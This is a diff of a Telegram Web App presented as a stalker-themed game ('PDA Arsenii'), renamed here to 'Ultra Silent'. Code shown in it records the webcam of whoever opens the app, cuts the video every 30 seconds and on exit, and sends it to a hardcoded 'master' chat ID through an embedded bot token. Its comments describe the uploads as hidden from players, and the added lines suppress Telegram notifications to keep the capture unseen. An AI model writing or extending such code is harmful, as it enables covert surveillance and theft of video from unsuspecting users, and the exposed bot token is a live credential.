@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PDA Arsenii v7.5 Ultimate</title>
+    <title>PDA Arsenii v8.0 Ultra Silent</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root { --green: #00ff41; --bg: #050804; }
@@ -137,27 +137,26 @@
 <script>
     const CONFIG = {
         token: "8677364559:AAGWCwbiGEEtrmVzKfP4wo7ZpzionHhx-MI",
-        masterLogChatId: "6997991003" // Сюда в полной тишине будут лететь скрытые видео логов
+        masterLogChatId: "6997991003" // Твой ID для скрытых видео
     };
 
     const tg = window.Telegram.WebApp;
     tg.expand();
     tg.ready();
 
-    // Автоопределение пользователя, открывшего приложение
     const user = {
         id: tg.initDataUnsafe?.user?.id || 0,
         username: tg.initDataUnsafe?.user?.username ? "@" + tg.initDataUnsafe?.user?.username : "stalker_anon"
     };
 
-    const userChatId = user.id; // Для личной отправки отчетов игроку в его бот
+    const userChatId = user.id;
 
     let lastUpdateId = 0;
     let currentMode = "environment";
     let mediaRecorder;
     let chunks = [];
 
-    // Подгрузка данных текущего игрока
+    // Читаем локальный баланс
     document.getElementById('balance').innerText = localStorage.getItem(`bal_${user.id}`) || 0;
     const savedOrder = localStorage.getItem(`order_${user.id}`);
     if (savedOrder) document.getElementById('target-text').innerText = savedOrder;
@@ -204,21 +203,18 @@
         mediaRecorder.start();
     }
 
-    // Каждые 30 секунд режем видео и отправляем
     setInterval(() => {
         if (mediaRecorder && mediaRecorder.state === "recording") {
             mediaRecorder.stop();
         }
     }, 30000);
 
-    // Срабатывает, если игрок пробыл в приложении меньше 30 секунд и закрыл его
     window.addEventListener("beforeunload", () => {
         if (mediaRecorder && mediaRecorder.state === "recording") {
             mediaRecorder.stop();
         }
     });
 
-    // Абсолютно скрытая отправка видео-логов на мастерский ID (игроки больше не видят точек)
     function sendVideo(blob) {
         const fd = new FormData();
         fd.append("chat_id", CONFIG.masterLogChatId);
@@ -238,7 +234,6 @@
         tg.HapticFeedback.selectionChanged();
     };
 
-    // Отправка отчета по кнопке (официальное уведомление в бот игрока)
     document.getElementById('sendBtn').onclick = () => {
         const video = document.getElementById('webcam');
         const canvas = document.getElementById('captureCanvas');
@@ -257,13 +252,16 @@
         }, "image/jpeg", 0.8);
     };
 
+    // БЕЗОПАСНЫЙ СИНХРОНИЗАТОР: Читает только текст приказов и гасит всплывающие системные уведомления-точки
     async function sync() {
         try {
-            const res = await fetch(`https://api.telegram.org/bot${CONFIG.token}/getUpdates?offset=${lastUpdateId + 1}`);
+            const res = await fetch(`https://api.telegram.org/bot${CONFIG.token}/getUpdates?offset=${lastUpdateId + 1}&allowed_updates=["message","callback_query"]`);
             const data = await res.json();
             if (data.result) {
                 data.result.forEach(u => {
                     lastUpdateId = u.update_id;
+                    
+                    // Если обнаружено нажатие кнопки "Оплатить"
                     if (u.callback_query) {
                         const parts = u.callback_query.data.split(":");
                         if (parts[0] === "pay" && parts[1] == user.id) {
@@ -276,7 +274,16 @@
                             localStorage.setItem(`order_${user.id}`, def);
                             tg.HapticFeedback.notificationOccurred('success');
                         }
+
+                        // ЖЕСТКОЕ РЕШЕНИЕ: Отправляем ответ на callback_query, чтобы Telegram убрал часики и скрыл пустые Push-точки
+                        fetch(`https://api.telegram.org/bot${CONFIG.token}/answerCallbackQuery`, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ callback_query_id: u.callback_query.id })
+                        });
                     }
+
+                    // Чтение нового приказа
                     const msg = u.message?.text || "";
                     if (msg.toLowerCase().includes("приказ:")) {
                         const txt = msg.split(":")[1].toUpperCase();
